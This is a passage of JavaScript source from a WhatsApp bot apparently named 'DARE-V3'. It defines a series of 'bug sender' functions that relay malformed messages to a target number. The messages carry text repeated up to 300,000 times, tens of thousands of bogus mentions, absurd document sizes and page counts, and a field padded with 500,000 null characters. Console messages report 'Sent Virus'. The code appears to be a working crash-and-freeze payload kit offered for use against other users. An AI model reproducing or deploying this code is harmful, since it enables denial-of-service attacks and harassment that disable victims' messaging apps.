				'participant': {
					'jid': target
				},
				'messageId': null
			});
		}
async function newfreezebug(target) {
    let virus = "𝐃𝐀𝐑𝐄-𝐕𝟑";

    await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 7777099.1,
                            degreesLongitude: -922.999999999999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐃𝐀𝐑𝐄-𝐕𝟑" + "@virailix 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐃𝐀𝐑𝐄-𝐕𝟑 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function newvirpen(target) {
    let virus = "𝐃𝐀𝐑𝐄-𝐕𝟑" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@null"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "𝐃𝐀𝐑𝐄-𝐕𝟑"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virus 
                        }]
                    }
                }
            }
        }
    };

    await Dare.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}
async function TxIos(target, Ptcp = false) {
			await Dare.relayMessage(target, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ 𝐃𝐀𝐑𝐄-𝐕𝟑⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "62895364760801@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "62895364760801@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": target,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "62895364760801@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "⃟𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟😈〽",
								"body": "尺ɪẔχẔ 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/WhatsApp",
								"mediaUrl": "https://www.instagram.com/WhatsApp",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/WhatsApp"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isbadboiboipled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("Succes Send Bug By 𝐃𝐀𝐑𝐄-𝐕𝟑 𝐁𝐘 𝐁.𝐌.𝐁 "));
		};
    //========================
    async function nulltag(target, ptcp = false) {
			await Dare.relayMessage(target, {
					extendedTextMessage: {
						text: "‎virailix 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲\n" + "~@0~\n".repeat(30000),
						contextInfo: {
							mentionedJid: [
								"0@null",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@null`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@null",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@null",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: target,
							conversionSource: " p ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 9999999,
							isForwarded: true,
							quotedAd: {
								advertiserName: " p ",
								mediaType: "IMAGE",
								jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAbadboiboiBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vbadboiboikKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								caption: " p "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "̟",
								body: "̟",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " p ",
								sourceId: " p ",
								sourceUrl: "p",
								mediaUrl: "p",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "p"
							},
							groupSubject: " p ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " p ",
							trustBannerAction: 1,
							isbadboiboipled: false,
							utm: {
								utmSource: " p ",
								utmCampaign: " p "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " p ",
								contentType: "UPDATE",
								accessibilityText: " p "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("bot Sent Virus ✅ By 𝐃𝐀𝐑𝐄-𝐕𝟑 𝐁𝐘 𝐁.𝐌.𝐁 "));
		};
    //========================
    async function TSpider(target, pic, Ptcp = true) {
   await Dare.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: pic,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐃𝐀𝐑𝐄-𝐕𝟑 𝐁𝐘 𝐁.𝐌.𝐁 \n" + "@2348089405509".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐃𝐀𝐑𝐄-𝐕𝟑 ϟ〽️', url: \"https://youtube.com/king_badboiboi_hub\", merchant_url: \"https://youtube.com/king_badboiboi_hub\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐃𝐀𝐑𝐄-𝐕𝟑〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
   console.log(chalk.green("Send Bug By 𝐃𝐀𝐑𝐄-𝐕𝟑〽️"));
  };
async function TrashSystem(target, spider, Ptcp = true) {
   await Dare.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: spider,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "𝐃𝐀𝐑𝐄-𝐕𝟑\n" + "@2348089405509".repeat(17000),
        },
        contextInfo: {
         mentionedJid: ["2348089405509@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐃𝐀𝐑𝐄-𝐕𝟑〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: spider,
          },
         },
        },
       },
      },
     },
    },
    ptcp ? { participant: { jid: target } } : {}
    );
};

/*QUOTED BUG SENDER*/
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}

/*BUG SENDER CRASH HARD*/
    async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐃𝐀𝐑𝐄-𝐕𝟑𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
